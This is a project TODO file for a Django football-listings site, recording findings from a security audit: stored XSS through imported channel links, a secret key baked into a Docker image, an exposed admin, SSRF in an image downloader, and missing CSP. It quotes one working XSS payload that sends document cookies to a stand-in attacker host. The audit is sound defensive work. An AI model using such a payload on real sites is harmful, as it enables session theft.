# Project Improvements TODO

Pending work is listed first, ordered by priority; completed work is indexed at the
bottom, with the detail in `CHANGELOG.md`.

Priority criteria, in order: exposure of the live site at www.mojon.es, then measured
cost on the request path, then maintainability, then cosmetics. Items whose cost is
only paid offline (management commands) or in the admin rank below anything on the
public path.

## Pending

Everything below came out of the security audit of 2026-08-11, ordered by criticality.
Findings marked *(verified)* were reproduced against the running system; the rest are
from reading the code and the deployed configuration. Nothing here is known to have been
exploited. The two critical findings — both outdated dependencies — were fixed and
deployed the same day; see Done.

### High

- [ ] **A `javascript:` link imported from a channel list reaches the page's `href`
  unvalidated — stored XSS.** `ChannelLink.link` declares `validators=[validate_channel_link]`
  and that validator does reject the payload, but **Django only runs field validators from
  `full_clean()`, which `Model.save()` never calls — and there is not a single `full_clean()`
  call in the codebase.** The import path uses `ChannelLink.objects.update_or_create(link=...)`,
  so the validator added for exactly this purpose is dead code outside the admin form.
  Reproduced end to end: importing `javascript:fetch('https://evil.example/'+document.cookie)`
  stores it and `link_button.html` renders `href="javascript:..."`; a `data:text/html;base64,…`
  URI gets through the same way. Escaping does not help — the payload is the URL, not
  markup. It fires on click, and `target="_blank"` is only applied to `http` schemes, so it
  runs in the page's own origin. The input is third-party: `newera.txt`, `elcano.txt` and
  `.m3u` files come from outside. Fix: enforce the scheme where the data enters
  (`import_entries`), not only in the admin — either by calling `full_clean()` or by
  filtering before the upsert — and add a template-side guard so a row already in the
  database cannot render a dangerous scheme. Existing rows need auditing. *(verified)*

- [ ] **`.env.production` — which holds `DJANGO_SECRET_KEY` — is baked into the Docker
  image.** `.dockerignore` lists `.env`, and that pattern matches only that exact
  filename, not `.env.production` or `.env.production.local`; `COPY . .` then copies all
  of them. Confirmed by inspecting the built image directly rather than the dev container,
  which bind-mounts the source and would have proved nothing. The key is otherwise sound
  (52 characters, ~310 bits), but a secret in an image layer survives in the host's layer
  cache and in any exported or shared image, and leaking it means forged sessions and
  signed cookies against an admin that answers to the public internet. Fix: add
  `.env*` to `.dockerignore` with `!.env.example` kept, rebuild, and rotate the key —
  it must be treated as exposed. *(verified: read out of `soccertime:latest`)*

### Medium

- [ ] **The admin is reachable from the internet with nothing slowing down a password
  guess.** `https://www.mojon.es/soccertime/admin/login/` answers 200 to the world, and
  there is no rate limiting, lockout, IP allowlist or second factor anywhere in the
  stack. The cookies are `Secure` and the path is prefixed, but neither is an obstacle to
  credential stuffing. Cheapest effective fix, in order of preference: restrict the route
  at Traefik to known addresses, or move it to a non-guessable path plus a login throttle.
  *(verified: HTTP 200 from outside)*

- [ ] **`DJANGO_ALLOWED_HOSTS=*` disables Django's Host header validation** while
  `DJANGO_USE_X_FORWARDED_HOST=true` makes Django trust a header the client can set.
  Traefik only routes `mojon.es` and `www.mojon.es`, so this is defence in depth rather
  than an open door — but it is the layer that catches the day the proxy rule is loosened
  or something reaches the container directly, and the site caches responses for an hour,
  which is what turns a poisoned absolute URL into everyone's problem. Fix: set it to the
  two real hostnames.

- [ ] **The image downloader accepts anything, of any size, from any address.**
  `download_image` passes `stream=True` and then reads `response.content`, which pulls the
  whole body into memory regardless of length — the 10-second timeout is per read, so a
  slow drip keeps it alive — inside a container limited to 512 MB. There is no
  content-type check, no cap on size, no restriction on the scheme or destination, and
  redirects are followed by default, so a URL from scraped HTML can point at a private
  address (SSRF). Related: `save_image` takes the stored file extension straight from the
  source URL with no allowlist, so a file that Pillow accepts but whose URL ends in
  `.html` would be written into the media volume and served by nginx as `text/html` from
  the site's own origin — `nosniff` does not help when the extension is explicit. All 8116
  files currently stored are `.webp`, so nothing is wrong today. Fix: cap the download
  size, verify the content type, and derive the extension from the decoded image rather
  than the URL.

- [ ] **No `Content-Security-Policy`.** Confirmed absent from the live response, which
  carries HSTS, `nosniff`, `X-Frame-Options: DENY` and a referrer policy but no CSP.
  Django 6.0 ships CSP support natively, so this no longer needs a third-party package.
  It is what would have contained the stored-XSS finding above, and it is the reason to
  do it even after that one is fixed. Note the templates carry inline `<script>` blocks,
  so this needs nonces rather than a one-line setting.

- [ ] **The image defaults to insecure and relies on an unversioned file to correct it.**
  The Dockerfile bakes `DJANGO_DEBUG=true` and `DJANGO_ADMIN_ENABLED=true`; production is
  safe only because `.env.production` overrides them, and that file is deliberately not in
  the repository. If it is missing or an entry is dropped, the container comes up in debug
  mode — full stack traces and settings to any visitor — and, with no `DJANGO_SECRET_KEY`
  set, falls back to the hardcoded `dev-only-insecure-key-not-for-production`, which makes
  session forgery trivial. Fix: default the image to the safe values and let development
  opt in, which is the direction the rest of the settings module already takes.

### Low

- [ ] **The production image ships the test, lint and type-checking toolchain.**
  `requirements.txt` has one list for everything, so pytest, ruff, mypy and django-stubs
  are installed in production — confirmed by listing packages in the running container.
  No known vulnerability, just avoidable surface and image size. Fix: split into
  `requirements.txt` and `requirements-dev.txt`.

- [ ] **`lxml` is the one unpinned dependency.** Every other line in `requirements.txt`
  carries an exact version; `lxml` sits alone at the bottom with none, so a rebuild can
  silently change the HTML parser the scraper depends on, and there is no record of what
  was tested. It resolved to 6.1.1. Fix: pin it.

- [ ] **The `search` parameter is unbounded.** `/agenda/?search=…` accepts any length and
  runs `icontains` across four joined tables in SQLite, and the first request for a given
  string is always a cache miss. Cheap to abuse, cheap to fix: cap the length.

- [ ] **`.env.production.local` carries a 20-character secret key** (~114 bits) against
  the 52 characters used in production. It is a local staging file, so the impact is
  limited, but it costs nothing to generate a proper one.

## Done

Detail for each of these is in `CHANGELOG.md` under the version that shipped it, and in
the git history. Kept here as an index of what has been through this file.

- **Channel matching** (0.2.1, 2026-08-10) — pinned `match_channels` with 41
  characterization tests, then rewrote it: 1236 queries and 638 ms down to 1 query and
  11 ms. The tests found two silent bugs first, one of them dropping every accented
  channel name.
- **Type hints** (0.2.0, 2026-08-10) — annotated 188 functions across 19 modules, put
  mypy and ruff's ANN rules behind them, and fixed the genuine type errors that surfaced.
  Deleted `channel_matchers.py`, 320 dead lines Django was advertising as a command.
- **Scraper reporting** (0.3.0, 2026-08-10) — events whose time is not yet announced are
  counted and named instead of being silently folded into `skipped`.
- **Security audit, critical findings** (2026-08-11) — Pillow 12.1.0 was in range for two
  CVEs that can reach arbitrary code execution through a crafted PSD, and this project
  hands Pillow bytes fetched from scraped URLs, where the extension is no protection
  because Pillow sniffs the content to choose its decoder; upgraded to 12.3.0. Django
  6.0.1 was five security releases behind, with fixes landing on ASGI request handling,
  the file-based cache and storage backends, `Vary` handling behind `cache_page` and
  `URLField` rendering in the admin — all in use here; upgraded to 6.0.8, staying on the
  6.0 series so it remained a security fix rather than a feature move. Verified in
  production afterwards: Pillow decodes the real stored images, `redownload_images`
  reports 0 missing files as before, checks and logs clean.
- **UI fixes** (0.3.1, 2026-08-11) — competition crest strip fits one row; the expander
  hides when there is nothing to expand.
- **Low-priority blocks D, E and F** (2026-08-10) — `LinkSchemeFilter` resolved in the
  database, consistent `ChannelLink` ordering across the site, private Django API removed
  from the admin, dry-run rollback done properly, duplicated model logic centralised, and
  the MTI question settled with a measurement recorded next to the code.
- **Medium blocks A, B and C** (2026-08-10) — the `env` template filter restricted to an
  allowlist, which had made `{{ "DJANGO_SECRET_KEY"|env }}` render the secret; dead model
  properties removed; presentation moved out of the models into `soccertime/rendering.py`;
  cache configuration fixed; the triplicated upsert in `scrapit` collapsed.
- **Production hardening and two self-inflicted outages** (2026-08-10) — `width_field` on
  an `ImageField` and `SECURE_SSL_REDIRECT` without an exemption for the health check each
  took the site down; both are now covered by regression tests and recorded in `CLAUDE.md`.
  The deploy verifies itself from outside the server, the production operations live in
  the `Makefile`, and the 49 missing flag images were restored and their loss explained.
- **Performance round** (2026-08-10) — `Event.Meta.ordering` reduced from two JOINs and a
  date cast to none, with listing order moved to `chronological()`; image dimensions read
  from the database instead of opening every file, 13.53 ms → 1.68 ms per 40 images.
- **Earlier reviews** — the Opus 4.6 round (N+1s in the global context, the admin and the
  scraping command; implicit `with_related()`; prefetch invalidation) and the Opus 5 round
  (a `ChannelLinkSource` deletion wiping unrelated links, a crashing reverse M2M edit, a
  500 on a malformed date parameter, duplicated favourites, a scrape aborting on a missing
  crest URL, a lost unique constraint, and per-request messages leaking into cached pages).
